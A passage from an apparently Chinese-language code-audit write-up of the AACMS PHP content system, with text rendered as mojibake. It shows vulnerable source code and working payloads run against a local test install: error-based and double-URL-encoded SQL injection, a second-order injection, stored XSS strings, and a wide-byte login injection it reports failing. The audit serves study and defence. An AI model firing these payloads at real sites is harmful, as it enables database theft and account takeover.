<code>var</code> çš„ [integer]æ•°å€¼ï¼Œæ‰€ä»¥å¯¼è‡´æ— æ³•å®ç°æ³¨å…¥ï¼›</p><h6 id="admin-php"><a href="#admin-php" class="headerlink" title="admin.php"></a>admin.php</h6><p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/9.png"></p><p>åœ¨æ²¡æœ‰ç™»é™†çš„çŠ¶æ€ä¸‹ï¼Œé»˜è®¤æ˜¯è¿›å…¥åˆ°admin_member.phpä¸­ï¼Œå¹¶ä¸”æ ¹æ®operationçš„å€¼è·³å…¥åˆ°æŒ‡å®šæ¨¡å—ä¸­å»</p><p>åˆ°è¿™é‡Œï¼Œä¸‰ä¸ªå…¥å£å‡½æ•°åŸºæœ¬äº†è§£æ¸…æ¥šï¼Œç”±äºindex.phpå’Œarticle.phpæ²¡æœ‰ä»€ä¹ˆå†…å®¹ï¼Œæ‰€ä»¥åªèƒ½ä»admin.phpå¤„ä¸‹æ‰‹è¿›è¡Œå®¡è®¡ã€‚</p><h4 id="æ¼æ´"><a href="#æ¼æ´" class="headerlink" title="æ¼æ´"></a>æ¼æ´</h4><h5 id="å‘ç°çš„æ¼æ´"><a href="#å‘ç°çš„æ¼æ´" class="headerlink" title="å‘ç°çš„æ¼æ´"></a>å‘ç°çš„æ¼æ´</h5><h6 id="1-å‰å°SQLæ³¨å…¥"><a href="#1-å‰å°SQLæ³¨å…¥" class="headerlink" title="1.å‰å°SQLæ³¨å…¥"></a>1.å‰å°SQLæ³¨å…¥</h6><p>è¿™é‡Œéœ€è¦å…ˆåœ¨åå°æ–‡ç« å¤„æ·»åŠ ä¸€ä¸ªæ ç›®</p><p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/15.png"></p><p>ç„¶åå†è®¿é—®<a href="http://127.0.0.1/aacms28/article.php%E5%B0%B1%E8%83%BD%E7%9C%8B%E5%88%B0">http://127.0.0.1/aacms28/article.phpå°±èƒ½çœ‹åˆ°</a></p><p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/16.png"></p><p>ç»™<code>catid</code>å‚æ•°åŠ ä¸ªå•å¼•å·,é¡µé¢çˆ†å‡ºæ•°æ®åº“é”™è¯¯</p><p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/17.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//127.0.0.1/aacms/article.php?catid=1)--%20  //é¡µé¢è¿”å›æ­£å¸¸</span><br></code></pre></td></tr></table></figure><p>ç”±æ­¤å¯ä»¥æ„é€ payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//127.0.0.1/aacms/article.php?catid=1)%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)%23</span><br></code></pre></td></tr></table></figure><p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/18.png"></p><p>è¿™é‡Œç”±äºæ˜¯é»‘ç›’æµ‹è¯•çš„ï¼Œæ‰€ä»¥éœ€è¦å»å›å»çœ‹ä¸€ä¸‹æºç ï¼Œçœ‹ä¸€ä¸‹æºç è¯¥æ¼æ´æ˜¯å¦‚ä½•å½¢æˆçš„ï¼Œå¯ä»¥æ ¹æ®æŠ¥é”™ä¿¡æ¯å»å¯»æ‰¾æ¼æ´ç‚¹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># æ¼æ´ä½ç½®ä½äº/aacms/source/function/block/block.article.php 25-40è¡Œ</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$paramarr</span>[<span class="hljs-string">&#x27;aid&#x27;</span>]) &#123; <span class="hljs-comment">// ä¼ å…¥catid,æ²¡æœ‰aidï¼Œæ‰€ä»¥ç›´æ¥è¿›å…¥else</span><br><span class="hljs-variable">$wherearr</span>[] = <span class="hljs-string">&#x27;aid IN (&#x27;</span>.<span class="hljs-variable">$paramarr</span>[<span class="hljs-string">&#x27;aid&#x27;</span>].<span class="hljs-string">&#x27;)&#x27;</span>;<br>&#125;  <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$catid</span> = <span class="hljs-variable">$paramarr</span>[<span class="hljs-string">&#x27;catid&#x27;</span>] ? <span class="hljs-variable">$paramarr</span>[<span class="hljs-string">&#x27;catid&#x27;</span>] : (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;catid&#x27;</span>] ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;catid&#x27;</span>] : <span class="hljs-string">&#x27;0&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$catid</span>) &#123;<br><span class="hljs-variable">$wherearr</span>[] = <span class="hljs-string">&#x27;catid IN (&#x27;</span>.<span class="hljs-variable">$catid</span>.<span class="hljs-string">&#x27;)&#x27;</span>;<span class="hljs-comment">// é‡‡ç”¨ç›´æ¥æ‹¼æ¥</span><br>&#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$wherearr</span>) &#123;<br><span class="hljs-variable">$sql</span>[<span class="hljs-string">&#x27;where&#x27;</span>] = implode(<span class="hljs-string">&#x27; AND &#x27;</span>, <span class="hljs-variable">$wherearr</span>);    <span class="hljs-comment">// è¿”å›ä¸€ä¸ªç”±æ•°æ®å…ƒç´ ç»„åˆæˆçš„å­—ç¬¦ä¸²</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$sql</span>[<span class="hljs-string">&#x27;where&#x27;</span>] = <span class="hljs-string">&#x27; 1 &#x27;</span>;<br>&#125;<br>    <span class="hljs-comment"># SELECT COUNT(*) FROM pre_article_index WHERE catid IN (1)</span><br><span class="hljs-variable">$count</span> = DB::getOne(<span class="hljs-string">&quot;SELECT COUNT(*) FROM &quot;</span>.DB::table(<span class="hljs-string">&#x27;article_index&#x27;</span>).<span class="hljs-string">&#x27; WHERE &#x27;</span>.<span class="hljs-variable">$sql</span>[<span class="hljs-string">&#x27;where&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>æ­¤å¤„æ˜¯å› ä¸ºå¯¹<code>$catid</code>ç›´æ¥æ‹¼æ¥ï¼Œå¹¶ä¸”è¯¥å˜é‡æ²¡æœ‰å•å¼•å·è¿›è¡Œä¿æŠ¤</p><h5 id="å¤ç°çš„æ¼æ´"><a href="#å¤ç°çš„æ¼æ´" class="headerlink" title="å¤ç°çš„æ¼æ´"></a>å¤ç°çš„æ¼æ´</h5><h6 id="1-urldecodeå¯¼è‡´çš„æ³¨å…¥æ¼æ´"><a href="#1-urldecodeå¯¼è‡´çš„æ³¨å…¥æ¼æ´" class="headerlink" title="1.urldecodeå¯¼è‡´çš„æ³¨å…¥æ¼æ´"></a>1.<strong>urldecodeå¯¼è‡´çš„æ³¨å…¥æ¼æ´</strong></h6><p>æ¼æ´ä½ç½® <code>\admin\admin_misc.php</code></p><p>è¿™ä¸ªæ¼æ´äº§ç”Ÿçš„åŸå› åœ¨äºç¨‹åºå¯¹äºæ¥å—çš„GETå‚æ•°å†æ¬¡è¿›è¡Œäº†urlè§£ç ï¼Œå› ä¸ºæµè§ˆå™¨åœ¨å‘webåº”ç”¨å‘é€å‚æ•°æ—¶æ˜¯å·²ç»è¿›è¡Œäº†ä¸€æ¬¡urlè§£ç ï¼Œç„¶åç»è¿‡<code>daddslashes()</code>è¿‡æ»¤ï¼Œä½†ç¨‹åºå†…éƒ¨å†ä¸€æ¬¡è¿›è¡Œäº†urlè§£ç ï¼Œå°±å¯¼è‡´å¯ä»¥é‡‡ç”¨ä¸¤æ¬¡urlç¼–ç æ¥ç»•è¿‡<code>daddslashes()</code>ï¼Œä»è€Œå®ç°æ³¨å…¥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$operation</span> == <span class="hljs-string">&#x27;custommenu_add&#x27;</span>) &#123;      <span class="hljs-comment">// æµè§ˆå™¨åœ¨å‘webåº”ç”¨ä¼ å‚æ—¶ä¼šè¿›è¡Œä¸€æ¬¡urlè§£ç </span><br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;title&#x27;</span>] &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]) &#123;        <span class="hljs-comment">// ä¸ä¸ºç©ºåˆ™è¿›å…¥</span><br><br><span class="hljs-variable">$title</span> = urldecode(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;title&#x27;</span>]);     <span class="hljs-comment">// urlå†æ¬¡è§£ç ï¼Œå¯¼è‡´å¯ä»¥ç›´æ¥ç»•è¿‡é­”æœ¯å¼•å·</span><br><span class="hljs-variable">$url</span> = urldecode(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br><br><span class="hljs-keyword">if</span>(DB::getOne(<span class="hljs-string">&quot;SELECT id FROM &quot;</span>.DB::table(<span class="hljs-string">&#x27;admincp_menu&#x27;</span>).<span class="hljs-string">&quot; WHERE title=&#x27;<span class="hljs-subst">$title</span>&#x27;&quot;</span>)) &#123;<br>cpmsg(<span class="hljs-string">&#x27;custommenu_duplicate&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;error&#x27;</span>);<br>&#125;<br>DB::insert(<span class="hljs-string">&#x27;admincp_menu&#x27;</span>, <span class="hljs-keyword">array</span>(<br><span class="hljs-string">&#x27;title&#x27;</span> =&gt; <span class="hljs-variable">$title</span>,<br><span class="hljs-string">&#x27;displayorder&#x27;</span> =&gt; <span class="hljs-number">0</span>,<br><span class="hljs-string">&#x27;url&#x27;</span> =&gt; <span class="hljs-variable">$url</span><br>));<br><br>cpmsg(<span class="hljs-string">&#x27;custommenu_add_succeed&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;succeed&#x27;</span>);<br><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>cpmsg(<span class="hljs-string">&#x27;parameters_error&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;error&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>æ„é€ <code>url:http://192.168.0.103/aacms28/admin.php?action=misc&amp;operation=custommenu_add&amp;url=456&amp;title=1%2527%20or%20updatexml(1,concat(0x7e,user()),1)%23</code></p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œçš„æ³¨é‡Šç¬¦ä¸èƒ½ç›´æ¥è¾“å…¥ï¼Œéœ€è¦å°†å…¶è¿›è¡Œurlç¼–ç åå†ä¼ å…¥</p><p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/10.png"></p><h6 id="2-äºŒæ¬¡æ³¨å…¥æ¼æ´"><a href="#2-äºŒæ¬¡æ³¨å…¥æ¼æ´" class="headerlink" title="2.äºŒæ¬¡æ³¨å…¥æ¼æ´"></a>2.äºŒæ¬¡æ³¨å…¥æ¼æ´</h6><p>å†å›æ¥çœ‹åˆšåˆšçš„ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$operation</span> == <span class="hljs-string">&#x27;custommenu_add&#x27;</span>) &#123;      <span class="hljs-comment">// æµè§ˆå™¨åœ¨å‘webåº”ç”¨ä¼ å‚æ—¶ä¼šè¿›è¡Œä¸€æ¬¡urlè§£ç </span><br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;title&#x27;</span>] &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]) &#123;        <span class="hljs-comment">// ä¸ä¸ºç©ºåˆ™è¿›å…¥</span><br><br><span class="hljs-variable">$title</span> = urldecode(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;title&#x27;</span>]);     <span class="hljs-comment">// urlå†æ¬¡è§£ç ï¼Œå¯¼è‡´å¯ä»¥ç›´æ¥ç»•è¿‡é­”æœ¯å¼•å·</span><br><span class="hljs-variable">$url</span> = urldecode(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br><br><span class="hljs-keyword">if</span>(DB::getOne(<span class="hljs-string">&quot;SELECT id FROM &quot;</span>.DB::table(<span class="hljs-string">&#x27;admincp_menu&#x27;</span>).<span class="hljs-string">&quot; WHERE title=&#x27;<span class="hljs-subst">$title</span>&#x27;&quot;</span>)) &#123;<br>cpmsg(<span class="hljs-string">&#x27;custommenu_duplicate&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;error&#x27;</span>);<br>&#125;<br>DB::insert(<span class="hljs-string">&#x27;admincp_menu&#x27;</span>, <span class="hljs-keyword">array</span>(<br><span class="hljs-string">&#x27;title&#x27;</span> =&gt; <span class="hljs-variable">$title</span>,<span class="hljs-comment">// ç›´æ¥å‘æ•°æ®åº“ä¸­æ’å…¥title</span><br><span class="hljs-string">&#x27;displayorder&#x27;</span> =&gt; <span class="hljs-number">0</span>,<br><span class="hljs-string">&#x27;url&#x27;</span> =&gt; <span class="hljs-variable">$url</span><br>));<br><br>cpmsg(<span class="hljs-string">&#x27;custommenu_add_succeed&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;succeed&#x27;</span>);<br><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>cpmsg(<span class="hljs-string">&#x27;parameters_error&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;error&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>èƒ½å¤Ÿå‘ç°ï¼Œä¸‹é¢è¿˜æœ‰ä¸€æ¡æ’å…¥è¯­å¥ï¼Œç”±äºé­”æœ¯å¼•å·å·²ç»è¢«ç»•è¿‡äº†ï¼Œæ‰€ä»¥è¿™é‡Œä¹Ÿåˆ©ç”¨ä¸€ä¸‹</p><p>å…ˆçœ‹ä¸€ä¸‹æ­£å¸¸æ’å…¥æ—¶ï¼Œæ•°æ®åº“çš„æ‰§è¡Œæƒ…å†µï¼Œæ‰§è¡Œ<code>title=1&amp;url=2</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">QueryDESC pre_admincp_menu<br>QueryINSERT INTO pre_admincp_menu (`title`, `url`, `displayorder`) VALUES (&#x27;1&#x27;, &#x27;2&#x27;, &#x27;0&#x27;)<br></code></pre></td></tr></table></figure><p>çœ‹åˆ°è¿™é‡Œå°±å¯ä»¥è¿›è¡Œpayloadçš„æ„é€ äº†</p><p>ç”±äºä¸Šé¢æœ‰<code>DB::getOne(&quot;SELECT id FROM &quot;.DB::table(&#39;admincp_menu&#39;).&quot; WHERE title=&#39;$title&#39;&quot;)</code></p><p>è¿™é‡Œå¯¹titleè¿›è¡Œäº†ä¸€ä¸ªæŸ¥è¯¢ï¼Œå¦‚æœå°†payloadæ’å…¥åˆ°titleä½ç½®ï¼Œé‚£ä¹ˆå°†ä¼šç›´æ¥å¯¼è‡´è¿™æ¡sqlè¯­å¥æ— æ³•æ­£å¸¸æ‰§è¡Œï¼Œç„¶åç¨‹åºæŠ¥é”™åœæ­¢ï¼Œæ‰€ä»¥åªèƒ½å°†payloadæ’å…¥åˆ°urlä½ç½®</p><p>æ„é€ <code>payload:</code> <code>title=1&amp;url=1%2527,1),(user(),1,2)%23</code></p><p>æˆ–æ˜¯ï¼š<code>title=1&amp;url=1%2527,0),(2,user(),1)%23</code>ï¼Œéƒ½èƒ½å¤Ÿå®ç°</p><p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/11.png"></p><p>å½“ç„¶ï¼Œè¿™é‡Œå…¶å®ä¸ç”¨çœ‹ä»£ç éƒ½èƒ½å¤Ÿå‘ç°ï¼Œå¤§æ¦‚ç‡å­˜åœ¨å­˜å‚¨å‹çš„è·¨ç«™</p><p><code>payload:</code> <code>title=&lt;img src=1 onerror=alert(1)&gt;&amp;url=1</code>éœ€è¦è¿›è¡Œurlç¼–ç </p><p><code>payload:</code> <code>title=%3c%69%6d%67%20%73%72%63%3d%31%20%6f%6e%65%72%72%6f%72%3d%61%6c%65%72%74%28%31%29%3e&amp;url=1</code></p><p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/12.png"></p><h6 id="3-XSSæ¼æ´"><a href="#3-XSSæ¼æ´" class="headerlink" title="3.XSSæ¼æ´"></a>3.XSSæ¼æ´</h6><p>å…ˆè·Ÿç€å¤§ä½¬çš„æ€è·¯èµ°</p><p>å›åˆ°admin_misc.phpä¸­</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$operation</span> == <span class="hljs-string">&#x27;custommenu&#x27;</span>) &#123;<br><br><span class="hljs-variable">$optionlist</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$query</span> = DB::query(<span class="hljs-string">&quot;SELECT * FROM &quot;</span>.DB::table(<span class="hljs-string">&#x27;admincp_menu&#x27;</span>).<span class="hljs-string">&quot; ORDER BY displayorder&quot;</span>);<br><span class="hljs-keyword">while</span>(<span class="hljs-variable">$custom</span> = DB::fetch(<span class="hljs-variable">$query</span>)) &#123;<br><span class="hljs-variable">$custom</span>[<span class="hljs-string">&#x27;url&#x27;</span>] = rawurldecode(<span class="hljs-variable">$custom</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br><span class="hljs-variable">$optionlist</span> .= showtablerow(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;class=&quot;td25&quot;&#x27;</span>, <span class="hljs-string">&#x27;class=&quot;td28&quot;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;class=&quot;td26&quot;&#x27;</span>), <span class="hljs-keyword">array</span>(<br><span class="hljs-string">&quot;&lt;input type=\&quot;checkbox\&quot; class=\&quot;checkbox\&quot; name=\&quot;delete[]\&quot; value=\&quot;<span class="hljs-subst">$custom</span>[id]\&quot;&gt;&quot;</span>,<br><span class="hljs-string">&quot;&lt;input type=\&quot;text\&quot; class=\&quot;txt\&quot; size=\&quot;3\&quot; name=\&quot;displayorder[<span class="hljs-subst">$custom</span>[id]]\&quot; value=\&quot;<span class="hljs-subst">$custom</span>[displayorder]\&quot;&gt;&quot;</span>,<br><span class="hljs-string">&quot;&lt;input type=\&quot;text\&quot; class=\&quot;txt\&quot; size=\&quot;25\&quot; name=\&quot;title[<span class="hljs-subst">$custom</span>[id]]\&quot; value=\&quot;&quot;</span>.cplang(<span class="hljs-variable">$custom</span>[<span class="hljs-string">&#x27;title&#x27;</span>]).<span class="hljs-string">&quot;\&quot;&gt;&quot;</span>,<br><span class="hljs-string">&quot;&lt;input type=\&quot;text\&quot; class=\&quot;txt\&quot; size=\&quot;40\&quot; name=\&quot;url[<span class="hljs-subst">$custom</span>[id]]\&quot; value=\&quot;<span class="hljs-subst">$custom</span>[url]\&quot;&gt;&quot;</span><br>), <span class="hljs-literal">TRUE</span>);<br>&#125;<br><br><span class="hljs-keyword">include</span> template(<span class="hljs-string">&#x27;misc_custommenu&#x27;</span>, <span class="hljs-string">&#x27;admin&#x27;</span>);<br><br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨å‰é¢çš„é€šè¯»ä¸­ï¼Œå·²çŸ¥è¯¥ç³»ç»Ÿå¹¶æ²¡æœ‰å¯¹XSSè¿›è¡Œç›¸å…³æ ¡éªŒï¼Œè€Œå°±ç®—è¾“å…¥ç»è¿‡<code>addslashes()</code>è¿‡æ»¤ï¼Œä¹Ÿå¹¶ä¸ä¼šå½±å“å‰æ®µHTMLæ ‡ç­¾çš„åŠ è½½ï¼Œæ‰€ä»¥ä¸Šè¿°ä»£ç ä¸­<code>$custom[url]</code>å’Œ<code>$custom[&#39;title&#39;]</code>éƒ½å¯èƒ½å­˜åœ¨XSSæ¼æ´</p><p>æ ¹æ®å‰æ®µé¡µé¢çš„æƒ…å†µæ„é€ payload</p><p><code>url=&quot; onclick=&quot;alert(1)</code></p><p><code>title=&quot; onclick=&quot;alert(1)</code></p><p>éœ€è¦è¿›è¡Œurlç¼–ç åå‘é€</p><p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/14.png"></p><p>ä½†è¿™é‡Œçš„ï¼Œå¦‚æœæµ‹è¯•XSSæ¼æ´çš„è¯ï¼Œå¯èƒ½é»‘ç›’ä¼šæ›´å¿«ä¸€äº›ï¼Œå› ä¸ºå·²ç»çŸ¥é“äº†webåº”ç”¨æ²¡æœ‰å¯¹XSSè¿›è¡Œä¸€ä¸ªæ ¡éªŒï¼Œæ‰€ä»¥èƒ½æ’å…¥çš„åœ°æ–¹ï¼Œå°±ä½¿åŠ²æ’å…¥payloadï¼Œç™½ç›’å¯ä»¥å°‘ä¸€äº›ã€‚</p><p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/13.png"></p><h5 id="æ— æ³•å¤ç°çš„æ¼æ´"><a href="#æ— æ³•å¤ç°çš„æ¼æ´" class="headerlink" title="æ— æ³•å¤ç°çš„æ¼æ´"></a>æ— æ³•å¤ç°çš„æ¼æ´</h5><h6 id="1-ç™»å½•ä½ç½®çš„å®½å­—èŠ‚æ³¨å…¥"><a href="#1-ç™»å½•ä½ç½®çš„å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="1.ç™»å½•ä½ç½®çš„å®½å­—èŠ‚æ³¨å…¥"></a>1.ç™»å½•ä½ç½®çš„å®½å­—èŠ‚æ³¨å…¥</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$operation</span> == <span class="hljs-string">&#x27;login&#x27;</span>) &#123;<br><br><span class="hljs-keyword">if</span>(submitcheck(<span class="hljs-string">&#x27;loginsubmit&#x27;</span>)) &#123;<br><br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;admin_username&#x27;</span>];<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;admin_password&#x27;</span>];<br><br><span class="hljs-variable">$member</span> = DB::getRow(<span class="hljs-string">&quot;SELECT * FROM &quot;</span>.DB::table(<span class="hljs-string">&#x27;member&#x27;</span>).<span class="hljs-string">&quot; WHERE username=&#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>);<br><span class="hljs-variable">$password</span> = md5(md5(<span class="hljs-variable">$password</span>).<span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;salt&#x27;</span>]);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$password</span> == <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;password&#x27;</span>] &amp;&amp; <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;groupid&#x27;</span>] == <span class="hljs-number">1</span>) &#123;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;uid&#x27;</span>] = <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;uid&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;timeoffset&#x27;</span>] = <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;timeoffset&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;groupid&#x27;</span>] = <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;groupid&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;permit&#x27;</span>] = <span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;permit&#x27;</span>] ? unserialize(<span class="hljs-variable">$member</span>[<span class="hljs-string">&#x27;permit&#x27;</span>]) : <span class="hljs-string">&#x27;&#x27;</span>;<br>&#125;<br><br>dheader(ADMINSCRIPT);<br><br>&#125; <span class="hljs-keyword">else</span> &#123;<br><br>@<span class="hljs-keyword">include_once</span> ROOT.<span class="hljs-string">&#x27;./source/aacms_version.php&#x27;</span>;<br><span class="hljs-keyword">include</span> template(<span class="hljs-string">&#x27;member_login&#x27;</span>, <span class="hljs-string">&#x27;admin&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>$username</code>ç›´æ¥æ‹¼æ¥è¿›æŸ¥è¯¢è¯­å¥ï¼Œç”±äºæ•°æ®åº“ç¼–ç ä¸ºGBKï¼Œæ‰€ä»¥å­˜åœ¨å®½å­—èŠ‚æ³¨å…¥ï¼Œæ’å…¥payloadä¹‹åï¼Œæ•°æ®åº“æ‰§è¡Œæ—¥å¿—å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">QuerySELECT * FROM pre_member WHERE username=&#x27;adminé‹&#x27; or updatexml(1,concat(1,user()),1)#&#x27;<br># å°†è¯¥è¯­å¥ä»£å…¥æ•°æ®åº“ä¸­è¿›è¡Œæ‰§è¡Œï¼Œå‘ç°æ˜¯èƒ½å¤ŸæˆåŠŸæ‰§è¡Œçš„ï¼Œè€Œè¯¥webåº”ç”¨æ²¡æœ‰è¿”å›æ•°æ®åº“æŠ¥é”™ä¿¡æ¯ï¼Œç›´æ¥301ï¼Œæ‰€ä»¥ä½¿ç”¨æŠ¥é”™æ³¨å…¥æ— æ³•å®ç°ï¼ŒçŒœæµ‹æ˜¯è¿™é‡Œæ²¡æœ‰å¼€å¯æŠ¥é”™ä¿¡æ¯<br># ä½¿ç”¨æ—¶é—´ç›²æ³¨ï¼Œå‘ç°æ— æ³•è¿›è¡Œå»¶æ—¶ï¼Œæ•°æ®åº“æœ€ç»ˆæ‰§è¡Œçš„payloadå¯ä»¥è¿›è¡Œå»¶è¿Ÿï¼Œæœªå‘ç°åŸå› <br># å †å æ³¨å…¥åŒæ ·æ— æ³•è¿›è¡Œ<br></code></pre></td></tr></table></figure><h6 id="2-åå°ä¸‡èƒ½å¯†ç ç™»å½•"><a href="#2-åå°ä¸‡èƒ½å¯†ç ç™»å½•" class="headerlink" title="2.åå°ä¸‡èƒ½å¯†ç ç™»å½•"></a>2.åå°ä¸‡èƒ½å¯†ç ç™»å½•</h6><p>è¿˜æ˜¯ä¸Šé¢çš„ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 